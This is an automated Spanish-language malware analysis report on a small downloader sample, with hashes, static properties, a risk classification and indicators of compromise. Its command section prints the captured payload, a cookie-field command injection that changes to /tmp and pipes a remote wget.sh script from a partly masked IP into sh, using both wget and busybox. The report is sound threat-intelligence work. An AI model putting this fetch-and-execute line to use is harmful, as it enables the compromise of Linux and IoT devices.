# 🧬 Payload Analysis

`3fcd3e2e667e339ed82ddc770bcf7ad39e67572c12e4e96ed25c1b0847b2ad46`

## 📌 Resumen

Texto ASCII de 321 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://91.92.40.XXX/wget.sh -O-`
2. `sh -s zyxsc`
3. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
4. `sh -s z` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/3fcd3e2e667e339ed82ddc770bcf7ad39e67572c12e4e96ed25c1b0847b2ad46.md](../../../../../malware-like/oraculo/downloader/3fcd3e2e667e339ed82ddc770bcf7ad39e67572c12e4e96ed25c1b0847b2ad46.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:11.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `3fcd3e2e667e339ed82ddc770bcf7ad39e67572c12e4e96ed25c1b0847b2ad46`
- **MD5:** `8c9c9c82332179d80ce579912c4cbc83`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 321 B |
| Entropía | 5.16 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
setCookie=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s zyxsc;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s z
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 190.179.168.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | setCookie=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s zyxsc;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s z | strings |
| hash | 3fcd3e2e667e339ed82ddc770bcf7ad39e67572c12e4e96ed25c1b0847b2ad46 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
